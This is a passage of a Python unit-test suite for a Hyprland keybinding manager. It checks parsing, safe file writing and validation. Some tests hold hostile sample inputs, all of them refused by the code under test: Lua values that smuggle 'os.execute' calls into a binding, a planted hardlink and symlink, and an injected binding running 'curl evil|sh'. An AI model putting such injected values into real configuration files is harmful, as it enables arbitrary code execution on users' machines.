        self.assertEqual(keys, ["SUPER + X", "SUPER + Y"])
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + X"])
        content = self._read()
        self.assertNotIn("SUPER + X", content)
        self.assertIn('o.bind("SUPER + Y", "Y", "keep")', content)

    def test_description_whitespace_preserved(self):
        self._write('o.bind("SUPER + W", "Close  Window", "cmd  x")\n')
        binds = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual(binds[0]["description"], "Close  Window")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + N", "description": "N", "command": "true"}])
        self.assertIn('o.bind("SUPER + W", "Close  Window", "cmd  x")', self._read())

    def test_description_with_quotes_roundtrip(self):
        # Descriptions the plugin itself writes must stay parseable: the old
        # [^"']+ header regex hid every binding whose description had a quote.
        desc = 'Bob\'s "Editor"'
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + B", "description": desc,
                           "command": "bobs"}],
            unbinds_to_add=["SUPER + B"])
        binds = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual([b["description"] for b in binds], [desc])
        self.assertEqual(keybinds_manager._written_bind_identity(
            {"key": "SUPER + B", "description": desc, "command": "bobs"})[0], desc)

    # -- backup safety net ---------------------------------------------------

    def test_backup_matches_previous_content(self):
        first = '-- original\nhl.unbind("SUPER + A")\n'
        self._write(first)
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + B", "description": "B", "command": "true"}])
        self.assertEqual(self._read_backup(), first)
        second = self._read()
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + C", "description": "C", "command": "true"}])
        self.assertEqual(self._read_backup(), second)

    # -- statement-aware editing --------------------------------------------

    def test_multiline_statement_replaced_as_a_whole(self):
        self._write('o.bind("SUPER + W", "Close Window",\n'
                    '  "hyprctl dispatch killactive")\n')
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + W", "description": "Close Window",
                           "command": "hyprctl dispatch closewindow"}],
            keys_to_remove=["SUPER + W"])
        content = self._read()
        self.assertNotIn('"hyprctl dispatch killactive")', content)
        self.assertIn(
            'o.bind("SUPER + W", "Close Window", "hyprctl dispatch closewindow")',
            content)
        self.assertEqual(len(keybinds_manager.parse_user_bindings()["binds"]), 1)

    def test_block_comment_bindings_are_inert_and_preserved(self):
        commented = ('--[[\nhl.unbind("SUPER + W")\n'
                     'o.bind("SUPER + Q", "Q", "q")\n]]\n')
        self._write(commented)
        parsed = keybinds_manager.parse_user_bindings()
        self.assertEqual(parsed["unbinds"], set())
        self.assertEqual(parsed["binds"], [])
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + W", "SUPER + Q"])
        self.assertIn(commented.strip(), self._read())

    def _stub_set_keybinding(self):
        """Keep set_keybinding off /usr/share and hyprctl."""
        self._orig_defaults = keybinds_manager.parse_default_bindings
        self._orig_reload = keybinds_manager.reload_hyprland
        keybinds_manager.parse_default_bindings = lambda: []
        keybinds_manager.reload_hyprland = lambda: {
            "success": True, "reload_output": "", "config_errors": ""}

    def _unstub_set_keybinding(self):
        keybinds_manager.parse_default_bindings = self._orig_defaults
        keybinds_manager.reload_hyprland = self._orig_reload

    def test_in_place_edit_keeps_second_binding_on_same_chord(self):
        # Editing one of two user bindings that share a chord must not delete
        # the other one (the old key-in-lines_to_add clause did). The row being
        # edited is identified by its previous description/command, because the
        # chord alone matches both.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Close", "a2", "", "SUPER + K",
                old_description="Close", old_command="a")
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + K", "Close", "a2")', content)
            self.assertEqual(content.count("o.bind("), 2)
        finally:
            self._unstub_set_keybinding()

    def test_new_binding_overrides_occupied_chord(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n')
            keybinds_manager.set_keybinding("SUPER + K", "Mine", "mine", "", "")
            content = self._read()
            self.assertNotIn('"Close"', content)
            self.assertIn('o.bind("SUPER + K", "Mine", "mine")', content)
        finally:
            self._unstub_set_keybinding()

    def test_in_place_rename_replaces_single_line(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Old name", "old")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "New name", "new", "", "SUPER + K")
            content = self._read()
            self.assertNotIn('"Old name"', content)
            self.assertIn('o.bind("SUPER + K", "New name", "new")', content)
        finally:
            self._unstub_set_keybinding()

    def test_dispatcher_looking_command_is_rejected(self):
        self._write("-- original\n")
        res = keybinds_manager.set_keybinding("SUPER + R", "Reload", "hl.dsp.reload()", "")
        self.assertFalse(res["success"])
        self.assertIn("dispatcher", res["error"])
        self.assertEqual(self._read(), "-- original\n")

    def test_quoted_action_is_stable_across_saves(self):
        self._write('o.bind("SUPER + Q", "Q", "echo \\"hi\\"")\n')
        for _ in range(2):
            bind = keybinds_manager.parse_user_bindings()["binds"][0]
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": bind["key"],
                               "description": bind["description"],
                               "command": bind.get("command") or bind["action"],
                               "action": bind["action"]}],
                keys_to_remove=[bind["key"]])
        self.assertIn('o.bind("SUPER + Q", "Q", "echo \\"hi\\"")', self._read())

    def test_crlf_line_endings_preserved(self):
        with open(self.path, "wb") as f:
            f.write(b'o.bind("SUPER + Z", "Z", "z")\r\n-- comment\r\n')
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + N", "description": "N", "command": "n"}])
        with open(self.path, "rb") as f:
            data = f.read()
        self.assertIn(b'-- comment\r\n', data)
        self.assertIn(b'o.bind("SUPER + N", "N", "n")\r\n', data)
        self.assertNotIn(b"\n", data.replace(b"\r\n", b""))

    # -- bounded reads -------------------------------------------------------

    def test_get_installed_apps_skips_oversized_and_special_files(self):
        app_dir = tempfile.mkdtemp(dir=self._tmpdir.name)
        with open(os.path.join(app_dir, "good.desktop"), "w", encoding="utf-8") as f:
            f.write("[Desktop Entry]\nType=Application\nName=Good\nExec=good --run\n")
        with open(os.path.join(app_dir, "big.desktop"), "w", encoding="utf-8") as f:
            f.write("[Desktop Entry]\nType=Application\nName=Big\nExec=big\nComment=")
            f.write("a" * (keybinds_manager.MAX_FILE_BYTES + 1))
        os.mkfifo(os.path.join(app_dir, "fifo.desktop"))
        apps = keybinds_manager.get_installed_apps(dirs=[app_dir])
        self.assertEqual([a["name"] for a in apps], ["Good"], apps)

    def test_fifo_bindings_do_not_block_and_are_refused_for_writing(self):
        os.mkfifo(self.path)
        # Everything that opens the FIFO runs in a worker: with O_NONBLOCK
        # dropped the open blocks forever, so the join deadline turns a hung
        # test run into a fast, named failure.
        result = {}

        def read_fifo():
            # Non-regular targets must be refused by the reader itself, not
            # merely skipped because an empty FIFO happens to read as "".
            result["reader"] = keybinds_manager._read_bounded_regular_file(self.path)
            result["parsed"] = keybinds_manager.parse_user_bindings()

        worker = threading.Thread(target=read_fifo, daemon=True)
        worker.start()
        worker.join(5)
        self.assertFalse(worker.is_alive(), "reading a FIFO blocked the reader")
        self.assertIsNone(result["reader"])
        self.assertEqual(result["parsed"]["binds"], [])
        self.assertEqual(result["parsed"]["unbinds"], set())
        with self.assertRaises(ValueError):
            keybinds_manager.write_user_bindings(unbinds_to_add=["SUPER + Z"])

    def test_installed_apps_scan_caps_are_enforced(self):
        app_dir = tempfile.mkdtemp(dir=self._tmpdir.name)
        for name in ("One", "Two", "Three"):
            with open(os.path.join(app_dir, name.lower() + ".desktop"), "w",
                      encoding="utf-8") as f:
                f.write("[Desktop Entry]\nType=Application\n"
                        f"Name={name}\nExec={name.lower()}\n")
        saved_files = keybinds_manager.MAX_APP_FILES
        saved_bytes = keybinds_manager.MAX_APP_TOTAL_READ
        try:
            keybinds_manager.MAX_APP_FILES = 2
            self.assertEqual(
                len(keybinds_manager.get_installed_apps(dirs=[app_dir])), 2)
            keybinds_manager.MAX_APP_FILES = saved_files
            keybinds_manager.MAX_APP_TOTAL_READ = 10
            self.assertEqual(
                len(keybinds_manager.get_installed_apps(dirs=[app_dir])), 1)
        finally:
            keybinds_manager.MAX_APP_FILES = saved_files
            keybinds_manager.MAX_APP_TOTAL_READ = saved_bytes

    def test_written_identity_treats_command_as_literal(self):
        # Half of the raw-vs-literal rule lives in the identity helper: a
        # command that looks like a dispatcher must still be quoted there.
        _desc, action = keybinds_manager._written_bind_identity(
            {"key": "SUPER + X", "description": "d",
             "command": "hl.dsp.window.close()"})
        # Identity compares VALUES now: the literal form on disk is free (a quoted
        # command, a [[...]] action, an escape) and re-encoding it is what broke
        # untouched saves.
        self.assertEqual(action, "hl.dsp.window.close()")
        _desc, raw = keybinds_manager._written_bind_identity(
            {"key": "SUPER + X", "description": "d", "command": "",
             "action": "hl.dsp.window.close()"})
        self.assertEqual(raw, "hl.dsp.window.close()")

    # -- in-place edits when several bindings share a chord ------------------

    def test_in_place_rename_replaces_only_the_edited_binding(self):
        # A rename changes both the description and the command, so the key can
        # no longer identify the line: the previous identity must. Before this
        # the old line survived and every save added one more.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Close", "a")', content)
            self.assertIn('o.bind("SUPER + K", "Exec v2", "kitty")', content)
            self.assertNotIn('"Exec", "b"', content)
            self.assertEqual(content.count("o.bind("), 2)
        finally:
            self._unstub_set_keybinding()

    def test_in_place_rename_refuses_when_chord_is_ambiguous(self):
        self._stub_set_keybinding()
        try:
            original = ('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K")
            self.assertFalse(res["success"])
            self.assertIn("share this chord", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_no_unbind_is_added_when_a_sibling_binding_is_preserved(self):
        # hl.unbind(<chord>) removes every binding on that chord at the
        # Hyprland level, so emitting it unconditionally made the panel show a
        # sibling that no longer existed.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertNotIn("hl.unbind", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_unbind_for_a_default_chord_precedes_every_user_bind(self):
        # When the chord is an Omarchy default the unbind is still needed, but it
        # must come first: Hyprland removes every bind registered before it, and
        # the user file loads after the defaults, so a trailing unbind would kill
        # the sibling binding kept above it.
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + K", "description": "Default", "action": "default"}]
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec v2", "kitty", "", "SUPER + K",
                old_description="Exec", old_command="b")
            lines = self._read().splitlines()
            unbind_at = lines.index('hl.unbind("SUPER + K")')
            binds_at = [i for i, l in enumerate(lines) if l.startswith("o.bind(")]
            self.assertEqual(len(binds_at), 2)
            self.assertLess(unbind_at, min(binds_at))
        finally:
            self._unstub_set_keybinding()

    # -- the writer proves the change landed ---------------------------------

    def test_edit_refuses_when_the_statement_cannot_be_isolated(self):
        # An unbalanced bracket above the binds collapses every following line
        # into one unit; the old writer wrote the file back unchanged and the
        # CLI still reported success.
        self._stub_set_keybinding()
        try:
            original = ('local x = foo(\n'
                        'o.bind("SUPER + 1", "One", "one")\n'
                        'o.bind("SUPER + 2", "Two", "two")\n')
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + 2", "Two v2", "two2", "", "SUPER + 2")
            self.assertFalse(res["success"])
            self.assertIn("nothing was written", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    # -- raw dispatcher validation ------------------------------------------

    def test_raw_dispatcher_rejects_newline_and_second_statement(self):
        for bad in ('hl.dsp.window.close())\nos.execute("touch /tmp/x") --',
                    'hl.dsp.window.close(); os.execute("touch /tmp/x")',
                    'hl.dsp.focus({ direction = "left"',):
            self.assertFalse(keybinds_manager._lua_single_expression_problem(bad) == "",
                             f"accepted a bad dispatcher: {bad!r}")
        for good in ('hl.dsp.window.close()',
                     'hl.dsp.window.move({ workspace = "e+1", follow = false })',
                     '{ "a", "b" }'):
            self.assertEqual(keybinds_manager._lua_single_expression_problem(good), "",
                             f"refused a valid dispatcher: {good!r}")

    def test_raw_dispatcher_with_second_statement_is_refused_by_the_writer(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + 2", "Two", "", 'hl.dsp.window.close()\nos.execute("id") --')
            self.assertFalse(res["success"])
            self.assertNotIn("os.execute", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_invalid_key_is_refused_by_every_verb(self):
        for verb in (keybinds_manager.disable_keybinding,
                     keybinds_manager.enable_keybinding,
                     keybinds_manager.reset_keybinding):
            res = verb('SUPER + A")')
            self.assertFalse(res["success"], f"{verb.__name__} accepted an unsafe key")
        self.assertFalse(os.path.exists(self.path) and "hl.unbind(\"\")" in self._read())

    # -- guards that must fail when deleted ---------------------------------

    def test_dangling_symlink_at_bindings_path_is_refused(self):
        # Deleting this guard made the plugin create the link target's
        # directory and write outside ~/.config; the suite stayed green.
        outside = os.path.join(self._tmpdir.name, "created-by-plugin", "bindings.lua")
        os.unlink(self.path) if os.path.exists(self.path) else None
        os.symlink(outside, self.path)
        with self.assertRaises(ValueError):
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": "SUPER + B", "description": "B", "command": "true"}])
        self.assertFalse(os.path.exists(outside))

    def test_backup_does_not_truncate_a_planted_hardlink(self):
        self._write('o.bind("SUPER + 1", "One", "one")\n')
        victim = os.path.join(self._tmpdir.name, "victim.txt")
        with open(victim, "w", encoding="utf-8") as f:
            f.write("do not touch\n")
        os.link(victim, self.path + ".bak")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + 2", "description": "Two", "command": "two"}])
        with open(victim, "r", encoding="utf-8") as f:
            self.assertEqual(f.read(), "do not touch\n")
        self.assertEqual(self._read_backup(), 'o.bind("SUPER + 1", "One", "one")\n')

    # -- round-2 review: the dispatcher check, unbind placement, identity -----

    def test_dispatcher_rejects_a_line_comment_tail(self):
        # `hl.foo() --` comments out the closing paren of the generated o.bind,
        # so bindings.lua stops compiling and Hyprland drops every user binding.
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.dsp.window.close() --"))
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.dsp.exec(\"a\") -- c"))
        self.assertTrue(keybinds_manager._lua_single_expression_problem("--[["))

    def test_dispatcher_rejects_trailing_escape_and_top_level_comma(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem("hl.foo() \\"))
        # A depth-0 comma becomes o.bind's fourth argument and is evaluated at
        # load time: a second expression smuggled into the file Hyprland runs.
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.close(), os.execute("/usr/bin/true")'))
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.close() or o.bind("SUPER + X", "pwned", "evil")'))

    def test_dispatcher_rejects_an_over_long_expression(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            'hl.foo("' + "A" * (keybinds_manager.MAX_CMD_LEN + 10) + '")'))
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.foo("' + "A" * 100 + '")'), "")

    def test_dispatcher_accepts_omarchy_helper_calls_and_long_strings(self):
        # Omarchy's own defaults bind helpers like o.launch_terminal(): they are
        # code, and editing such a binding must not turn them into a string.
        self.assertTrue(keybinds_manager._is_raw_dispatcher("o.launch_terminal()"))
        self.assertEqual(keybinds_manager._lua_single_expression_problem("o.launch_terminal()"), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.exec([==[echo "a;b" --x]==])'), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            'hl.dsp.window.move({ workspace = "e+1", follow = false })'), "")

    def test_dispatcher_looking_command_is_refused_not_written_as_code(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            for text in ("o.launch_terminal()", "hl.dsp.window.close()", "{ a; b; }"):
                res = keybinds_manager.set_keybinding("SUPER + 2", "Two", text)
                self.assertFalse(res["success"], text)
            self.assertNotIn("launch_terminal", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_unbind_is_not_placed_inside_a_leading_block_comment(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close", "action": "o.close()"}]
            self._write('--[[\nlegacy notes\n-- kept\n]]\no.bind("SUPER + W", "Close", "a")\n')
            keybinds_manager.set_keybinding("SUPER + W", "Close v2", "b")
            content = self._read()
            block = content.split("]]")[0]
            self.assertNotIn("hl.unbind", block)
            self.assertIn('hl.unbind("SUPER + W")', content)
            parsed = keybinds_manager.parse_user_bindings()
            self.assertIn("SUPER + W", parsed["unbinds"])
        finally:
            self._unstub_set_keybinding()

    def test_rename_onto_the_sibling_description_keeps_the_sibling(self):
        # Identity matching on description OR action deleted a sibling that only
        # shared one half with the row being edited.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            keybinds_manager.set_keybinding(
                "SUPER + K", "Exec", "kitty", "", "SUPER + K",
                old_description="Close", old_command="a")
            content = self._read()
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + K", "Exec", "kitty")', content)
            self.assertNotIn('o.bind("SUPER + K", "Close", "a")', content)
        finally:
            self._unstub_set_keybinding()

    def test_reset_reports_the_write_separately_from_the_reload(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.reload_hyprland = lambda: {"success": False, "error": "no session"}
            self._write('o.bind("SUPER + 1", "One", "one")\n')
            res = keybinds_manager.reset_keybinding("SUPER + 1")
            self.assertTrue(res["success"], res)
            self.assertFalse(res["reload_success"])
            self.assertNotIn("o.bind(", self._read())
        finally:
            self._unstub_set_keybinding()

    # -- round-3 review: statements, identities, BOM, control bytes -----------

    def test_rename_of_a_helper_call_with_a_quoted_argument_replaces_it(self):
        # The identity helper classed o.<name>(...) as a command string while the
        # writer emitted it as code, so the old line never matched and every save
        # appended another copy.
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + M", "Move left", o.workspaces.move_to_monitor("l"))\n'
                        'o.bind("SUPER + M", "Other", "other")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + M", "Move left v2", "", 'o.workspaces.move_to_monitor("l")',
                "SUPER + M", old_description="Move left",
                old_action='o.workspaces.move_to_monitor("l")')
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertEqual(content.count('o.workspaces.move_to_monitor("l")'), 1)
            self.assertIn('o.bind("SUPER + M", "Move left v2"', content)
            self.assertIn('o.bind("SUPER + M", "Other", "other")', content)
        finally:
            self._unstub_set_keybinding()

    def test_chord_change_requires_the_previous_identity(self):
        self._stub_set_keybinding()
        try:
            original = 'o.bind("SUPER + K", "Close", "a")\n'
            self._write(original)
            res = keybinds_manager.set_keybinding(
                "SUPER + J", "Close", "a", "", "SUPER + K")
            self.assertFalse(res["success"])
            self.assertIn("previous description", res["error"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_chord_change_with_identity_moves_the_binding(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Close", "a")\n'
                        'o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + L", "Close", "a", "", "SUPER + K",
                old_description="Close", old_command="a")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertNotIn('o.bind("SUPER + K", "Close", "a")', content)
            self.assertIn('o.bind("SUPER + K", "Exec", "b")', content)
            self.assertIn('o.bind("SUPER + L", "Close", "a")', content)
        finally:
            self._unstub_set_keybinding()

    def test_line_with_a_second_statement_is_refused_not_deleted(self):
        # The unit scanner groups by physical lines: dropping such a unit took the
        # neighbouring statement with it and left bindings.lua uncompilable.
        self._stub_set_keybinding()
        try:
            original = ('o.bind("SUPER + RETURN", "Terminal", "y"); if true then\n'
                        '  local q = 1\n'
                        'end\n')
            self._write(original)
            res = keybinds_manager.disable_keybinding("SUPER + RETURN")
            self.assertFalse(res["success"])
            self.assertIn("another statement", res["error"])
            self.assertEqual(self._read(), original)
            res = keybinds_manager.set_keybinding(
                "SUPER + RETURN", "Terminal v2", "y2", "", "SUPER + RETURN",
                old_description="Terminal", old_command="y")
            self.assertFalse(res["success"])
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_leading_bom_stays_at_offset_zero(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close", "action": "o.close()"}]
            self._write('\ufeff-- head\no.bind("SUPER + W", "Close", "a")\n')
            res = keybinds_manager.set_keybinding("SUPER + W", "Close v2", "b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertTrue(content.startswith("\ufeff"), repr(content[:20]))
            self.assertEqual(content.count("\ufeff"), 1)
            self.assertIn('hl.unbind("SUPER + W")', content)
        finally:
            self._unstub_set_keybinding()

    def test_control_bytes_never_reach_the_lua_literal(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + N", "Note\x00", "notify-send a\x01b")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertNotIn("\x00", content)
            self.assertNotIn("\x01", content)
        finally:
            self._unstub_set_keybinding()

    # -- round-4 review: quoted commands, nil rows, blind spots ---------------

    def test_quoted_command_round_trips_through_the_model(self):
        # The model hands the editor a DECODED command, so an untouched save is
        # byte-stable; unescaping in the dialog escaped it again every save.
        self._stub_set_keybinding()
        try:
            original = 'o.bind("SUPER + H", "Say Hi", "echo \\"hi\\"")\n'
            self._write(original)
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            self.assertEqual(row["command"], 'echo "hi"')
            res = keybinds_manager.set_keybinding(
                "SUPER + H", row["description"], row["command"], "", "SUPER + H",
                old_description=row["description_raw"], old_command="", old_action="")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_nil_description_row_is_replaced_not_duplicated(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + E", nil, "edcmd")\n')
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            self.assertEqual(row["description_raw"], "")
            res = keybinds_manager.set_keybinding(
                "SUPER + E", "Renamed", "edcmd", "", "SUPER + E",
                old_description=row["description_raw"], old_command="edcmd")
            self.assertTrue(res["success"], res)
            content = self._read()
            self.assertEqual(content.count("o.bind("), 1)
            self.assertIn('o.bind("SUPER + E", "Renamed", "edcmd")', content)
        finally:
            self._unstub_set_keybinding()

    def test_bind_not_at_the_start_of_its_line_is_refused_not_ignored(self):
        self._stub_set_keybinding()
        try:
            original = ('if true then o.bind("SUPER + C", "gamma", "c") end\n'
                        'o.bind("SUPER + B", "beta", "b")\n')
            self._write(original)
            res = keybinds_manager.disable_keybinding("SUPER + C")
            self.assertFalse(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_case_only_rename_is_a_legal_edit(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + K", "Exec", "b")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + K", "exec", "b", "", "SUPER + K",
                old_description="Exec", old_command="b")
            self.assertTrue(res["success"], res)
            self.assertIn('o.bind("SUPER + K", "exec", "b")', self._read())
        finally:
            self._unstub_set_keybinding()

    def test_a_bracketed_unbind_is_removable(self):
        # `hl["unbind"]("K")` is legal Lua and Hyprland honours it: it used to be
        # invisible, so the chord showed as enabled while it stayed unbound.
        self._stub_set_keybinding()
        try:
            self._write('hl["unbind"]("SUPER + X")\n')
            res = keybinds_manager.enable_keybinding("SUPER + X")
            self.assertTrue(res["success"], res)
            self.assertNotIn("unbind", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_enable_refuses_when_the_unbind_cannot_be_removed(self):
        self._stub_set_keybinding()
        try:
            original = 'hl.unbind(("SUPER + X"))\n'
            self._write(original)
            res = keybinds_manager.enable_keybinding("SUPER + X")
            self.assertFalse(res["success"], res)
            self.assertEqual(self._read(), original)
        finally:
            self._unstub_set_keybinding()

    def test_a_dispatcher_may_not_register_another_binding(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + F7", "d", "", 'o.bind("SUPER + F9", "injected", "curl evil|sh")')
            self.assertFalse(res["success"])
            self.assertIn("may not register another binding", res["error"])
            self.assertNotIn("SUPER + F9", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_a_refused_edit_keeps_the_previous_backup(self):
        self._stub_set_keybinding()
        try:
            with open(self.path + ".bak", "w", encoding="utf-8") as f:
                f.write("-- PREVIOUS KNOWN-GOOD BACKUP\n")
            self._write('o.bind("SUPER + RETURN", "T", "y"); if true then\nend\n')
            res = keybinds_manager.disable_keybinding("SUPER + RETURN")
            self.assertFalse(res["success"])
            self.assertEqual(self._read_backup(), "-- PREVIOUS KNOWN-GOOD BACKUP\n")
        finally:
            self._unstub_set_keybinding()

    def test_undecodable_default_bindings_file_is_skipped(self):
        # A latin-1 file in the defaults dir used to abort the whole model build.
        import tempfile as _tf
        with _tf.TemporaryDirectory() as d:
            with open(os.path.join(d, "ok.lua"), "w", encoding="utf-8") as f:
                f.write('o.bind("SUPER + J", "Jump", "j")\n')
            with open(os.path.join(d, "bad.lua"), "wb") as f:
                f.write(b'o.bind("SUPER + K", "K\xe9", "k")\n')
            saved = keybinds_manager.DEFAULT_BINDINGS_DIR
            keybinds_manager.DEFAULT_BINDINGS_DIR = d
            try:
                binds = keybinds_manager.parse_default_bindings()
            finally:
                keybinds_manager.DEFAULT_BINDINGS_DIR = saved
        self.assertTrue(any(b["key"] == "SUPER + J" for b in binds))

    # -- round-5 review: literal forms, duplication proof, model honesty --------

    def _save_untouched(self, line):
        self._stub_set_keybinding()
        try:
            self._write(line + "\n")
            row = keybinds_manager.parse_user_bindings()["binds"][0]
            res = keybinds_manager.set_keybinding(
                row["key"], row["description"], row["command"], "", row["key"],
                old_description=row.get("description_raw", ""),
                old_command=row["command"], old_action=row["action"])
            return res, self._read()
        finally:
            self._unstub_set_keybinding()

    def test_wholly_quoted_command_survives_an_untouched_save(self):
        line = r'o.bind("SUPER + R", "Run", "\"$HOME/My App/run\"")'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_long_bracket_action_survives_an_untouched_save(self):
        line = 'o.bind("SUPER + K", "K", [[echo "hi" ]])'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_escape_sequences_survive_an_untouched_save(self):
        line = r'o.bind("SUPER + T", "T", "printf \"a\nb\"")'
        res, content = self._save_untouched(line)
        self.assertTrue(res["success"], res)
        self.assertEqual(content, line + "\n")

    def test_over_long_description_is_refused_not_truncated(self):
        long_desc = "L" * 260
        res, content = self._save_untouched(f'o.bind("SUPER + B", "{long_desc}", "b")')
        # Truncating on the way to disk rewrote the user's row to 200 characters
        # while reporting success; the refusal names the field.
        self.assertFalse(res["success"])
        self.assertIn("description is longer", res["error"])
        self.assertEqual(content.count("o.bind("), 1)

    def test_long_bracket_key_is_removed_by_disable(self):
        self._stub_set_keybinding()
        try:
            self._write('-- mine\no.bind([[SUPER + W]], "Close", "killactive")\n')
            res = keybinds_manager.disable_keybinding("SUPER + W")
            self.assertTrue(res["success"], res)
            self.assertNotIn("o.bind(", self._read())
        finally:
            self._unstub_set_keybinding()

    def test_a_commented_unbind_does_not_veto_the_real_one(self):
        self._stub_set_keybinding()
        try:
            self._write('--[[\nhl.unbind("SUPER + W")\n]]\n')
            res = keybinds_manager.disable_keybinding("SUPER + W")
            self.assertTrue(res["success"], res)
            units = [t for _u, t, c in keybinds_manager._lua_units(
                keybinds_manager._split_lines(self._read())[0]) if t and not c]
            self.assertTrue(any(u.strip().startswith("hl.unbind") for u in units), units)
        finally:
            self._unstub_set_keybinding()

    def test_a_second_chord_keeps_the_default_row(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + W", "description": "Close Window", "action": "killactive"}]
            self._write('o.bind("SUPER + SHIFT + Q", "Close Window", "killactive")\n')
            model = keybinds_manager.build_complete_model()
            keys = {b["key"] for b in model["active"]}
            self.assertIn("SUPER + W", keys)
        finally:
            self._unstub_set_keybinding()

    def test_junk_chords_are_refused_and_a_lone_modifier_too(self):
        # Omarchy itself ships modifier-only chords (o.bind_hold("ALT + Alt_R", ...))
        # and switch keysyms with spaces and slashes, so those must pass; junk does not.
        self._stub_set_keybinding()
        try:
            self._write("")
